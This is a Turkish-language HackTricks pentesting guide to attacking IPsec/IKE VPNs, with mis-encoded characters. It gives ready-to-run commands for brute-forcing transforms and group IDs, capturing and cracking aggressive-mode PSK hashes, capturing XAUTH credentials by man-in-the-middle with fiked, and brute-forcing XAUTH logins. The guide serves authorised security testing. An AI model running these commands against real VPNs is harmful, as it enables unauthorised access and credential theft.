# 500/udp - IPsec/IKE VPN Pentesting

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

En Ã¶nemli olan zayÄ±flÄ±klarÄ± bulun, bÃ¶ylece daha hÄ±zlÄ± dÃ¼zeltebilirsiniz. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Temel Bilgiler

**IPsec**, aÄŸlar arasÄ±ndaki iletiÅŸimi (LAN-to-LAN) ve uzaktan kullanÄ±cÄ±larÄ±n aÄŸ aÄŸ geÃ§idine (uzaktan eriÅŸim) gÃ¼vence altÄ±na almak iÃ§in temel teknoloji olarak geniÅŸ Ã§apta kabul edilir ve kurumsal VPN Ã§Ã¶zÃ¼mleri iÃ§in omurga gÃ¶revi gÃ¶rÃ¼r.

Ä°ki nokta arasÄ±nda bir **gÃ¼venlik birliÄŸi (SA)** oluÅŸturulmasÄ±, kimlik doÄŸrulama ve anahtar deÄŸiÅŸimi iÃ§in tasarlanmÄ±ÅŸ bir protokol olan **IKE** tarafÄ±ndan yÃ¶netilir ve ISAKMP'nin bir parÃ§asÄ± olarak Ã§alÄ±ÅŸÄ±r. Bu sÃ¼reÃ§ birkaÃ§ aÅŸamada gerÃ§ekleÅŸir:

- **AÅŸama 1:** Ä°ki uÃ§ nokta arasÄ±nda gÃ¼venli bir kanal oluÅŸturulur. Bu, bir Ã–n PaylaÅŸÄ±lan Anahtar (PSK) veya sertifikalar kullanÄ±larak gerÃ§ekleÅŸtirilir ve Ã¼Ã§ Ã§ift mesaj iÃ§eren ana mod veya **agresif mod** kullanÄ±r.
- **AÅŸama 1.5:** Zorunlu olmasa da, GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama AÅŸamasÄ± olarak bilinen bu aÅŸama, baÄŸlanmaya Ã§alÄ±ÅŸan kullanÄ±cÄ±nÄ±n kimliÄŸini doÄŸrular ve bir kullanÄ±cÄ± adÄ± ve ÅŸifre gerektirir.
- **AÅŸama 2:** Bu aÅŸama, **ESP** ve **AH** ile verileri gÃ¼vence altÄ±na almak iÃ§in parametreleri mÃ¼zakere etmeye adanmÄ±ÅŸtÄ±r. AÅŸama 1'deki algoritmalardan farklÄ± algoritmalarÄ±n kullanÄ±lmasÄ±na izin verir ve gÃ¼venliÄŸi artÄ±rmak iÃ§in **MÃ¼kemmel Ä°leri Gizlilik (PFS)** saÄŸlar.

**VarsayÄ±lan port:** 500/udp

## nmap kullanarak hizmeti keÅŸfedin
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **GeÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulma**

IPSec yapÄ±landÄ±rmasÄ±, yalnÄ±zca bir veya birkaÃ§ dÃ¶nÃ¼ÅŸÃ¼mÃ¼ kabul etmek Ã¼zere hazÄ±rlanabilir. Bir dÃ¶nÃ¼ÅŸÃ¼m, deÄŸerlerin bir kombinasyonudur. **Her dÃ¶nÃ¼ÅŸÃ¼m**, ÅŸifreleme algoritmasÄ± olarak DES veya 3DES gibi birkaÃ§ Ã¶zelliÄŸe sahiptir, bÃ¼tÃ¼nlÃ¼k algoritmasÄ± olarak SHA veya MD5 gibi birkaÃ§ Ã¶zelliÄŸe sahiptir, kimlik doÄŸrulama tÃ¼rÃ¼ olarak Ã¶nceden paylaÅŸÄ±lan bir anahtar gibi birkaÃ§ Ã¶zelliÄŸe sahiptir, anahtar daÄŸÄ±tÄ±m algoritmasÄ± olarak Diffie-Hellman 1 veya 2 gibi birkaÃ§ Ã¶zelliÄŸe sahiptir ve Ã¶mÃ¼r olarak 28800 saniye gibi birkaÃ§ Ã¶zelliÄŸe sahiptir.

Daha sonra yapmanÄ±z gereken ilk ÅŸey, sunucu sizinle iletiÅŸim kurabilsin diye **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmaktÄ±r**. Bunun iÃ§in **ike-scan** aracÄ±nÄ± kullanabilirsiniz. VarsayÄ±lan olarak, Ike-scan ana modda Ã§alÄ±ÅŸÄ±r ve bir ISAKMP baÅŸlÄ±ÄŸÄ± ve iÃ§inde sekiz dÃ¶nÃ¼ÅŸÃ¼m bulunan tek bir Ã¶neri ile bir paket gÃ¶nderir.

YanÄ±ta baÄŸlÄ± olarak uÃ§ nokta hakkÄ±nda bazÄ± bilgiler elde edebilirsiniz:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
GÃ¶rÃ¼ldÃ¼ÄŸÃ¼ gibi Ã¶nceki yanÄ±tta **AUTH** adÄ±nda bir alan ve **PSK** deÄŸeriyle birlikte olduÄŸunu gÃ¶rebilirsiniz. Bu, vpn'in bir Ã¶nceden paylaÅŸÄ±lan anahtar kullanÄ±larak yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ± anlamÄ±na gelir (ve bu bir pentester iÃ§in gerÃ§ekten iyidir).\
**Son satÄ±rÄ±n deÄŸeri de Ã§ok Ã¶nemlidir:**

* _0 el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼ldÃ¼; 0 bildirim dÃ¶ndÃ¼rÃ¼ldÃ¼:_ Bu, hedefin bir **IPsec aÄŸ geÃ§idi olmadÄ±ÄŸÄ±nÄ±** gÃ¶sterir.
* _**1 el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼ldÃ¼; 0 bildirim dÃ¶ndÃ¼rÃ¼ldÃ¼:**_ Bu, **hedefin IPsec iÃ§in yapÄ±landÄ±rÄ±ldÄ±ÄŸÄ±nÄ± ve IKE mÃ¼zakeresi yapmaya istekli olduÄŸunu ve Ã¶nerdiÄŸiniz dÃ¶nÃ¼ÅŸÃ¼mlerden bir veya daha fazlasÄ±nÄ±n kabul edilebilir olduÄŸunu** gÃ¶sterir (geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m Ã§Ä±ktÄ±da gÃ¶sterilecektir).
* _0 el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼ldÃ¼; 1 bildirim dÃ¶ndÃ¼rÃ¼ldÃ¼:_ VPN aÄŸ geÃ§itleri, **hiÃ§bir dÃ¶nÃ¼ÅŸÃ¼mÃ¼n kabul edilebilir olmadÄ±ÄŸÄ±nda** bir bildirim mesajÄ±yla yanÄ±t verir (ancak bazÄ± aÄŸ geÃ§itleri bunu yapmaz, bu durumda daha fazla analiz ve revize edilmiÅŸ bir Ã¶neri denemelisiniz).

Bu durumda zaten geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼mÃ¼mÃ¼z var, ancak 3. durumdaysanÄ±z, geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m bulmak iÃ§in **biraz brute-force yapmanÄ±z gerekecektir:**

Ä°lk olarak, tÃ¼m olasÄ± dÃ¶nÃ¼ÅŸÃ¼mleri oluÅŸturmanÄ±z gerekmektedir:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
Ve ardÄ±ndan ike-scan kullanarak her birini brute-force yÃ¶ntemiyle deneyin (bu birkaÃ§ dakika sÃ¼rebilir):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
EÄŸer brute-force yÃ¶ntemi iÅŸe yaramadÄ±ysa, belki sunucu geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mlere bile el sÄ±kÄ±ÅŸma yapmadan yanÄ±t veriyor. Bu durumda, aynÄ± brute-force yÃ¶ntemini kullanarak saldÄ±rgan modunu deneyebilirsiniz:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
UmarÄ±m **geÃ§erli bir dÃ¶nÃ¼ÅŸÃ¼m yansÄ±tÄ±lÄ±r**.\
AynÄ± saldÄ±rÄ±yÄ± [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) kullanarak deneyebilirsiniz.\
AyrÄ±ca [**ikeforce**](https://github.com/SpiderLabs/ikeforce) ile dÃ¶nÃ¼ÅŸÃ¼mleri kaba kuvvet saldÄ±rÄ±sÄ±yla deneyebilirsiniz:
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (109).png>)

**DH Grubu: 14 = 2048-bit MODP** ve **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (bu durumda). `--trans` formatÄ± $Enc,$Hash,$Auth,$DH'dir.**

Cisco, DH gruplarÄ±nÄ±n 1 ve 2'nin yeterince gÃ¼Ã§lÃ¼ olmadÄ±ÄŸÄ±nÄ± belirtmektedir. Uzmanlar, bu zayÄ±f gruplarÄ± kullanan verilerin ÅŸifrelemesini **kÄ±rmak iÃ§in** Ã¶zel bir yÃ¶ntem kullanarak **kaynaklarÄ± bol olan Ã¼lkelerin** bunu kolayca yapabileceÄŸine inanmaktadÄ±r. Bu yÃ¶ntemi kurmak Ã§ok para harcamasÄ±na raÄŸmen, bu gÃ¼Ã§lÃ¼ Ã¼lkelerin, ÅŸifrelenmiÅŸ verileri gerÃ§ek zamanlÄ± olarak okumasÄ±na izin verir (Ã¶rneÄŸin, 1.024-bit veya daha kÃ¼Ã§Ã¼k gibi) zayÄ±f bir grup kullanÄ±lÄ±yorsa.

### Sunucu parmak izi alma

ArdÄ±ndan, cihazÄ±n **Ã¼reticisini keÅŸfetmek iÃ§in ike-scan** kullanabilirsiniz. AraÃ§, bir baÅŸlangÄ±Ã§ teklifi gÃ¶nderir ve tekrar oynatmayÄ± durdurur. ArdÄ±ndan, sunucudan alÄ±nan mesajlar ile eÅŸleÅŸen yanÄ±t deseni arasÄ±ndaki **zaman farkÄ±nÄ± analiz ederek**, pentester VPN aÄŸ geÃ§idinin Ã¼reticisini baÅŸarÄ±yla belirleyebilir. DahasÄ±, bazÄ± VPN sunucularÄ± IKE ile **isteÄŸe baÄŸlÄ± Vendor ID (VID) yÃ¼kÃ¼** kullanacaktÄ±r.

**Gerekirse geÃ§erli dÃ¶nÃ¼ÅŸÃ¼mÃ¼ belirtin** (using --trans)

EÄŸer IKE, Ã¼reticiyi belirlerse, bunu yazdÄ±racaktÄ±r:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Bu, nmap betiÄŸi _**ike-version**_ ile de baÅŸarÄ±labilir.

## DoÄŸru Kimlik (grup adÄ±) Bulma

Hash'i yakalayabilmek iÃ§in Agresif modu destekleyen ve doÄŸru Kimlik (grup adÄ±) gerekiyor. Muhtemelen doÄŸru grup adÄ±nÄ± bilmeyeceksiniz, bu yÃ¼zden brute-force yapmanÄ±z gerekecek.\
Bunu yapmak iÃ§in size 2 yÃ¶ntem Ã¶neririm:

### ike-scan ile Kimlik brute-force

Ã–ncelikle, hash'i toplamak iÃ§in sahte bir Kimlik ile bir istek yapmayÄ± deneyin ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
EÄŸer **hiÃ§bir karma dÃ¶ndÃ¼rÃ¼lmezse**, o zaman muhtemelen bu brute force yÃ¶ntemi iÅŸe yarayacaktÄ±r. **EÄŸer bir karma dÃ¶ndÃ¼rÃ¼lÃ¼rse, bu, sahte bir kimlik iÃ§in sahte bir karma gÃ¶nderileceÄŸi anlamÄ±na gelir, bu nedenle bu yÃ¶ntem kimliÄŸi brute force etmek iÃ§in gÃ¼venilir olmayacaktÄ±r**. Ã–rneÄŸin, sahte bir karma dÃ¶ndÃ¼rÃ¼lebilir (bu modern sÃ¼rÃ¼mlerde olur):

![](<../.gitbook/assets/image (110).png>)

Ancak, dediÄŸim gibi, hiÃ§bir karma dÃ¶ndÃ¼rÃ¼lmezse, ike-scan kullanarak yaygÄ±n grup adlarÄ±nÄ± brute force etmeyi denemelisiniz.

Bu betik, **mÃ¼mkÃ¼n olan kimlikleri brute force etmeye Ã§alÄ±ÅŸacak** ve geÃ§erli bir el sÄ±kÄ±ÅŸma dÃ¶ndÃ¼rÃ¼len kimlikleri (bu geÃ§erli bir grup adÄ± olacak) dÃ¶ndÃ¼recektir.

EÄŸer belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, ike-scan komutuna ekleyin. Ve eÄŸer birden fazla dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekte Ã¶zgÃ¼rsÃ¼nÃ¼z (hepsini dÃ¼zgÃ¼n Ã§alÄ±ÅŸana kadar hepsini denemelisiniz).

Bu iÅŸlemi brute force etmek iÃ§in ikeforce'un [sÃ¶zlÃ¼ÄŸÃ¼nÃ¼](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) veya yaygÄ±n grup adlarÄ±nÄ±n bulunduÄŸu seclists'in [birini](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) kullanabilirsiniz:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Veya bu sÃ¶zlÃ¼ÄŸÃ¼ kullanÄ±n (tekrarlarÄ± olmadan diÄŸer 2 sÃ¶zlÃ¼ÄŸÃ¼n birleÅŸimi):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Iker ile ID'yi Bruteforce Etme

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py), olasÄ± grup adlarÄ±nÄ± bruteforce etmek iÃ§in **ike-scan** kullanÄ±r. **ike-scan** Ã§Ä±ktÄ±sÄ±na dayanarak geÃ§erli bir ID bulmak iÃ§in kendi yÃ¶ntemini izler.

### Ikeforce ile ID'yi Bruteforce Etme

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce), **ID'leri bruteforce etmek** iÃ§in kullanÄ±lan bir araÃ§tÄ±r. Bu araÃ§, **geÃ§erli ve geÃ§ersiz bir ID arasÄ±ndaki farkÄ± belirlemek** iÃ§in kullanÄ±labilecek **farklÄ± gÃ¼venlik aÃ§Ä±klarÄ±nÄ±** kullanmaya Ã§alÄ±ÅŸacaktÄ±r (yanlÄ±ÅŸ pozitif ve yanlÄ±ÅŸ negatif sonuÃ§lar olabilir, bu yÃ¼zden mÃ¼mkÃ¼nse ike-scan yÃ¶ntemini tercih ederim).

VarsayÄ±lan olarak, **ikeforce** baÅŸlangÄ±Ã§ta sunucunun davranÄ±ÅŸÄ±nÄ± kontrol etmek ve kullanÄ±lacak taktiÄŸi belirlemek iÃ§in bazÄ± rastgele ID'ler gÃ¶nderir.

* **Ä°lk yÃ¶ntem**, Cisco sistemlerinin **Dead Peer Detection DPD** bilgisini (bu bilgi yalnÄ±zca grup adÄ± doÄŸruysa sunucu tarafÄ±ndan yanÄ±tlanÄ±r) arayarak grup adlarÄ±nÄ± bruteforce etmektir.
* **Ä°kinci yÃ¶ntem**, her denemeye gÃ¶nderilen yanÄ±tlarÄ±n sayÄ±sÄ±nÄ± kontrol eder Ã§Ã¼nkÃ¼ doÄŸru ID kullanÄ±ldÄ±ÄŸÄ±nda bazen daha fazla paket gÃ¶nderilir.
* **ÃœÃ§Ã¼ncÃ¼ yÃ¶ntem**, yanlÄ±ÅŸ ID'ye yanÄ±t olarak "INVALID-ID-INFORMATION" aramaktÄ±r.
* Son olarak, sunucu kontrollerine hiÃ§bir yanÄ±t vermezse, **ikeforce** sunucuyu bruteforce etmeye Ã§alÄ±ÅŸacak ve doÄŸru ID gÃ¶nderildiÄŸinde sunucunun bir paketle yanÄ±t verip vermediÄŸini kontrol edecektir.\
AÃ§Ä±kÃ§asÄ±, ID'yi bruteforce etmenin amacÄ±, geÃ§erli bir ID'ye sahip olduÄŸunuzda **PSK'yi** elde etmektir. ArdÄ±ndan, **ID** ve **PSK** ile XAUTH'Ä± (etkinse) bruteforce etmeniz gerekecektir.

Belirli bir dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, ikeforce komutuna ekleyin. Ve birden fazla dÃ¶nÃ¼ÅŸÃ¼m keÅŸfettiyseniz, hepsini denemek iÃ§in yeni bir dÃ¶ngÃ¼ eklemekte Ã¶zgÃ¼rsÃ¼nÃ¼z (hepsini dÃ¼zgÃ¼n Ã§alÄ±ÅŸana kadar denemelisiniz).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### ID Yakalama

(**Network Security Assessment: AÄŸÄ±nÄ±zÄ± TanÄ±yÄ±n** kitabÄ±ndan): VPN istemcisi ve sunucusu arasÄ±ndaki baÄŸlantÄ±yÄ± dinleyerek geÃ§erli kullanÄ±cÄ± adlarÄ±nÄ± elde etmek de mÃ¼mkÃ¼ndÃ¼r, Ã§Ã¼nkÃ¼ istemci kimliÄŸini iÃ§eren ilk saldÄ±rgan mod paketi aÃ§Ä±k bir ÅŸekilde gÃ¶nderilir.

![](<../.gitbook/assets/image (111).png>)

## Hash Yakalama ve KÄ±rma

Son olarak, bir **geÃ§erli dÃ¶nÃ¼ÅŸÃ¼m** ve **grup adÄ±** bulduysanÄ±z ve **saldÄ±rgan mod izin veriliyorsa**, o zaman Ã§Ã¶zÃ¼lebilir hash'i Ã§ok kolay bir ÅŸekilde yakalayabilirsiniz:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
Hash _hash.txt_ iÃ§ine kaydedilecektir.

Hash'i **kÄ±rmak** iÃ§in **psk-crack**, **john** ( [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py) kullanarak) ve **hashcat** kullanabilirsiniz:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**Grup kimlik doÄŸrulama** amaÃ§larÄ± iÃ§in genellikle **Ã–n PaylaÅŸÄ±lan Anahtar (PSK)** ile birlikte **Agresif Mod IKE** kullanÄ±lÄ±r. Bu yÃ¶ntem, **XAuth (GeniÅŸletilmiÅŸ Kimlik DoÄŸrulama)** ile desteklenir ve ek bir **kullanÄ±cÄ± kimlik doÄŸrulama** katmanÄ± ekler. Bu tÃ¼r kimlik doÄŸrulama genellikle **Microsoft Active Directory**, **RADIUS** veya benzeri sistemler gibi hizmetlerden yararlanÄ±r.

**IKEv2**'ye geÃ§iÅŸte, kullanÄ±cÄ±larÄ±n kimlik doÄŸrulamasÄ± iÃ§in **XAuth** yerine **EAP (GeniÅŸletilebilir Kimlik DoÄŸrulama ProtokolÃ¼)** kullanÄ±ldÄ±ÄŸÄ± dikkat Ã§ekmektedir. Bu deÄŸiÅŸiklik, gÃ¼venli iletiÅŸim protokollerinde kimlik doÄŸrulama uygulamalarÄ±nda bir evrimi vurgular.


### Kimlik bilgilerini yakalamak iÃ§in Yerel AÄŸ MitM

BÃ¶ylece, _fiked_ kullanarak giriÅŸ verilerini yakalayabilir ve herhangi bir varsayÄ±lan kullanÄ±cÄ± adÄ± olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz (IKE trafiÄŸini dinlemek iÃ§in ARP sahtekarlÄ±ÄŸÄ±yla `fiked`'e yÃ¶nlendirmeniz gerekmektedir, [daha fazla bilgi](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked, bir VPN uÃ§ noktasÄ± gibi davranacak ve XAuth kimlik bilgilerini yakalayacaktÄ±r:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
AyrÄ±ca, IPSec kullanarak bir MitM saldÄ±rÄ±sÄ± yapmaya Ã§alÄ±ÅŸÄ±n ve tÃ¼m trafiÄŸi 500 numaralÄ± porta engelleyin, eÄŸer IPSec tÃ¼neli kurulamazsa, trafiÄŸin aÃ§Ä±k olarak gÃ¶nderilebilir.

### ikeforce ile XAUTH kullanÄ±cÄ± adÄ± ve ÅŸifresini brute force etmek

**XAUTH**'u brute force etmek iÃ§in (geÃ§erli bir grup adÄ± **id** ve **psk**'yi bildiÄŸinizde) bir kullanÄ±cÄ± adÄ± veya kullanÄ±cÄ± adÄ± listesi ve bir ÅŸifre listesi kullanabilirsiniz:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Bu ÅŸekilde, ikeforce, her bir kullanÄ±cÄ± adÄ±:parola kombinasyonunu kullanarak baÄŸlantÄ± deneyecektir.

EÄŸer bir veya birkaÃ§ geÃ§erli dÃ¶nÃ¼ÅŸÃ¼m bulduysanÄ±z, bunlarÄ± Ã¶nceki adÄ±mlarda olduÄŸu gibi kullanÄ±n.

## IPSEC VPN ile Kimlik DoÄŸrulama

Kali'de, IPsec tÃ¼nelleri kurmak iÃ§in **VPNC** kullanÄ±lÄ±r. **Profiller**, `/etc/vpnc/` dizininde bulunmalÄ±dÄ±r. Bu profilleri _**vpnc**_ komutunu kullanarak baÅŸlatabilirsiniz.

AÅŸaÄŸÄ±daki komutlar ve yapÄ±landÄ±rmalar, VPNC ile bir VPN baÄŸlantÄ±sÄ± kurma sÃ¼recini gÃ¶stermektedir:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Bu kurulumda:

- `[VPN_GATEWAY_IP]` ifadesini VPN aÄŸ geÃ§idinin gerÃ§ek IP adresiyle deÄŸiÅŸtirin.
- `[VPN_CONNECTION_ID]` ifadesini VPN baÄŸlantÄ±sÄ±nÄ±n tanÄ±mlayÄ±cÄ±sÄ±yla deÄŸiÅŸtirin.
- `[VPN_GROUP_SECRET]` ifadesini VPN'nin grup parolasÄ±yla deÄŸiÅŸtirin.
- `[VPN_USERNAME]` ve `[VPN_PASSWORD]` ifadelerini VPN kimlik doÄŸrulama bilgileriyle deÄŸiÅŸtirin.
- `[PID]`, `vpnc` baÅŸlatÄ±ldÄ±ÄŸÄ±nda atanacak iÅŸlem kimliÄŸini simgeler.

VPN yapÄ±landÄ±rmasÄ± yapÄ±lÄ±rken yer tutucularÄ±n yerine gerÃ§ek, gÃ¼venli deÄŸerlerin kullanÄ±ldÄ±ÄŸÄ±ndan emin olun.

## Referans Materyal

* [PSK kÄ±rma makalesi](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [VPN UygulamasÄ±nÄ± Tarama](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3. BaskÄ±

## Shodan

* `port:500 IKE`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

En Ã¶nemli gÃ¼venlik aÃ§Ä±klarÄ±nÄ± bulun ve daha hÄ±zlÄ± dÃ¼zeltebilin. Intruder saldÄ±rÄ± yÃ¼zeyinizi takip eder, proaktif tehdit taramalarÄ± yapar, API'lerden web uygulamalarÄ±na ve bulut sistemlerine kadar tÃ¼m teknoloji yÄ±ÄŸÄ±nÄ±nÄ±zda sorunlarÄ± bulur. [**Ãœcretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugÃ¼n.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
